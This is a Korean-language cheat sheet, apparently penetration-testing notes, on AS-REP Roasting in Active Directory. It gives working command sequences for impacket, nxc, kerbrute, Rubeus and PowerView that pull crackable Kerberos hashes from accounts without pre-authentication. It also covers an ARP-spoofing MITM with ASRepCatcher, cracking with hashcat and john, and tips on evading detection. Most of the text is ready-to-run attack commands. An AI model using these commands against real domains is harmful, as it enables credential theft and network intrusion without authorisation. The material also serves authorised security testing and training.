# 02_AS-REP_Roasting

# AD 외부침투 — AS-REP Roasting

---

## 개념

Kerberos 인증에서 클라이언트는 AS-REQ(Authentication Service Request)를 보낼 때 자신의 패스워드로 암호화한 타임스탬프를 함께 전송한다. KDC는 이 타임스탬프를 복호화해 올바른 자격증명인지 검증한 뒤 TGT를 발급한다. 이 단계를 사전 인증(Pre-Authentication)이라고 하며, 무차별 대입을 방지하는 핵심 메커니즘이다.

일부 계정에는 `DONT_REQ_PREAUTH`(UF_DONT_REQUIRE_PREAUTH, 값 4194304) 속성이 설정되어 있어 타임스탬프 없이 유저명만으로 AS-REQ를 보내도 KDC가 검증 단계를 건너뛰고 AS-REP를 돌려준다. 이 AS-REP 안에는 해당 계정의 패스워드를 키로 암호화한 세션 키(enc-part)가 포함되어 있기 때문에 오프라인으로 크래킹이 가능하다. 이 공격이 AS-REP Roasting이다.

이 속성이 설정되는 이유는 대부분 레거시 애플리케이션이 Kerberos 사전 인증을 지원하지 않거나, 운영팀이 문제 해결을 위해 임시로 비활성화한 뒤 원상복구를 하지 않았기 때문이다. 실전에서 생각보다 자주 발견되는 설정이다.

중요한 차이점은 유효한 도메인 자격증명 없이도 KDC에 직접 AS-REQ를 보낼 수 있다는 점이다. 즉 유저명 목록만 있으면 외부 네트워크에서도 시도할 수 있다.

---

## impacket-GetNPUsers

GetNPUsers(NP = No Preauthentication)는 유저명 목록의 각 계정에 대해 순차적으로 AS-REQ를 날려 `DONT_REQ_PREAUTH` 설정 여부를 확인하고, 해당 계정이 있으면 AS-REP에서 암호화된 파트를 추출해 hashcat/john 포맷으로 출력한다.

- `outputfile` 옵션을 사용할 때 중요한 점이 있다. 해시 출력 로직이 터미널이 아닌 파일 핸들러로 연결되기 때문에, 터미널에 성공 메시지가 전혀 없어도 파일에 해시가 정상 저장된 경우가 많다. 반드시 `cat`으로 파일을 직접 확인해야 한다.

취약하지 않은 계정에는 `[-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set` 메시지가 찍히고 다음 계정으로 넘어간다.

```bash
# 자격증명 없을 때 — 유저명 목록 필요
impacket-GetNPUsers corp.local/ \
  -dc-ip <DC_IP> \
  -no-pass \
  -usersfile users.txt \
  -format hashcat \
  -outputfile asrep.hashes

# 터미널 오류 메시지 제거하고 해시만 보기 (outputfile 없이 직접 파싱)
impacket-GetNPUsers corp.local/ \
  -dc-ip <DC_IP> \
  -no-pass \
  -usersfile users.txt \
  -format hashcat 2>/dev/null | grep '\$krb5asrep\$'

# 자격증명 있을 때 — LDAP으로 취약 계정 자동 열거 후 요청
# 유저명 목록 불필요, 도메인 전체를 스캔
impacket-GetNPUsers corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile asrep.hashes

# john 포맷으로 출력
impacket-GetNPUsers corp.local/john:'Password1!' \
  -dc-ip <DC_IP> \
  -request \
  -format john \
  -outputfile asrep.hashes

# NTLM 해시로 인증
impacket-GetNPUsers corp.local/john \
  -hashes :<NTLM> \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile asrep.hashes

# Kerberos 인증 (ccache 있을 때)
export KRB5CCNAME=/tmp/john.ccache
impacket-GetNPUsers corp.local/john \
  -k -no-pass \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile asrep.hashes

# 실행 후 무조건 파일 직접 확인
cat asrep.hashes
wc -l asrep.hashes
```

---

## nxc

nxc의 `--asreproast` 옵션은 GetNPUsers와 동일한 공격을 수행하되, LDAP을 통해 자동으로 취약 계정을 탐지한다. 자격증명 없을 때는 유저명 파일을 `-u`에 전달하고, 자격증명이 있을 때는 LDAP 쿼리로 알아서 탐색한다.

```bash
# 자격증명 없을 때 — 유저명 파일 전달
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.hashes

# 자격증명 있을 때 — 도메인 전체 자동 탐색
nxc ldap <DC_IP> -u john -p 'Password1!' --asreproast asrep.hashes

# NTLM 해시로
nxc ldap <DC_IP> -u john -H <NTLM> --asreproast asrep.hashes

# DC FQDN 지정 (Kerberos 인증 필요한 환경)
nxc ldap <DC_IP> -u john -p 'Password1!' \
  --asreproast asrep.hashes \
  --kdcHost dc01.corp.local

# SMB로도 가능
nxc smb <DC_IP> -u john -p 'Password1!' --asreproast asrep.hashes
```

---

## kerbrute

kerbrute로 유저명 열거 중 `DONT_REQ_PREAUTH` 계정이 발견되면 자동으로 AS-REP 해시를 함께 출력한다. 유저명 열거와 AS-REP Roasting을 한 번에 처리할 수 있어 초기 침투 단계에서 매우 효율적이다. 별도로 GetNPUsers를 돌릴 필요 없이 kerbrute 한 번으로 동시에 처리된다.

```bash
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# 출력에서 해시 추출
kerbrute userenum \
  -d corp.local \
  --dc <DC_IP> \
  users.txt 2>/dev/null | grep '\$krb5asrep\$' > asrep.hashes
```

---

## Rubeus (Windows / 도메인 내부)

Rubeus는 C#으로 작성된 Kerberos 공격 툴킷으로, 도메인에 참여한 머신에서 실행하면 LDAP으로 취약 계정을 자동 열거하고 한 번에 모든 계정의 해시를 가져온다. 기본적으로 RC4 암호화로 요청하기 때문에 Event ID 4768에서 암호화 타입이 `0x17`로 기록된다. AES 암호화 계정도 RC4로 다운그레이드해서 받을 수 있지만 탐지 위험이 있다.

`/nowrap` 플래그가 없으면 해시가 여러 줄로 나뉘어져 hashcat에 넣을 수 없다. 반드시 붙여야 한다.

```powershell
# 도메인 내 취약 계정 전체 자동 탐색
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes /nowrap

# 특정 유저 지정
.\Rubeus.exe asreproast /user:john /format:hashcat /outfile:asrep.hashes /nowrap

# AES 암호화로 요청 (RC4 탐지 우회 — 더 스텔스하지만 크래킹 느림)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes /aes /nowrap

# john 포맷
.\Rubeus.exe asreproast /format:john /outfile:asrep.hashes /nowrap

# 특정 OU 대상
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes /nowrap `
  /ldapfilter:"(ou=ServiceAccounts)"
```

---

## PowerView (Windows / 취약 계정 열거)

PowerView 자체는 해시를 추출하지 않지만, `DONT_REQ_PREAUTH`가 설정된 계정을 정확하게 찾아주는 용도로 쓴다. 이후 발견된 계정을 Rubeus나 GetNPUsers에 타겟으로 전달하는 방식으로 조합한다.

```powershell
Import-Module .\PowerView.ps1

# DONT_REQ_PREAUTH 계정 열거
Get-DomainUser -PreauthNotRequired -Verbose

# 특정 속성만 출력
Get-DomainUser -PreauthNotRequired `
  -Properties samaccountname, userprincipalname, distinguishedname

# AD 모듈 (RSAT)로도 가능
Get-ADUser -Filter 'useraccountcontrol -band 4194304' `
  -Properties useraccountcontrol, description | `
  Select-Object samaccountname, description
```

---

## ASRepCatcher (MITM — 사전 인증 비활성 계정 없어도 가능)

일반적인 AS-REP Roasting과 다르게, 사전 인증이 비활성화된 계정이 도메인에 하나도 없어도 동작하는 방식이다. ARP 스푸핑으로 네트워크에서 MITM 포지션을 잡은 뒤 Kerberos 협상 과정에 개입해, 클라이언트가 사용할 암호화 타입을 RC4로 다운그레이드하도록 강제한다. 그 과정에서 클라이언트가 보내는 AS-REQ와 KDC가 응답하는 AS-REP를 가로채 크래킹 가능한 해시를 수집한다.

실제 인증이 완료되기 때문에 피해자 입장에서는 정상 동작하는 것처럼 보이고, 탐지가 매우 어렵다.

```bash
pip install asrepcatcher

# 특정 인터페이스에서 리스닝
asrepcatcher listen --interface eth0

# 특정 서브넷 대상
asrepcatcher listen --interface eth0 --target 10.10.10.0/24
```

---

## 크랙

해시 앞부분으로 암호화 타입을 구분한다. `$23$`은 RC4, `$17$`은 AES128, `$18$`은 AES256이다. RC4가 가장 빠르게 크래킹되고, AES128/256은 상대적으로 훨씬 오래 걸린다.

```
$krb5asrep$23$alice@CORP.LOCAL:...  <- RC4   (hashcat mode 18200)
$krb5asrep$17$alice@CORP.LOCAL:...  <- AES128 (john --format=krb5asrep)
$krb5asrep$18$alice@CORP.LOCAL:...  <- AES256 (john --format=krb5asrep)
```

```bash
# RC4 크랙 — hashcat mode 18200
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt

# 룰 기반 (성공률 높음)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# 여러 룰 체인
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule

# AES — john 사용
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5asrep asrep.hashes

# 크랙된 결과 확인
hashcat -m 18200 asrep.hashes --show
john --show --format=krb5asrep asrep.hashes
```

---

## 흐름

kerbrute / RID brute / LDAP으로 유저명 열거 → users.txt 확보 → GetNPUsers 또는 nxc로 AS-REQ 전송 → asrep.hashes 파일 직접 확인 (터미널 메시지 믿지 말 것) → RC4 여부 확인 → hashcat / john으로 크래킹 → 유효 자격증명 확보 → 패스워드 스프레이 / Kerberoasting으로 이동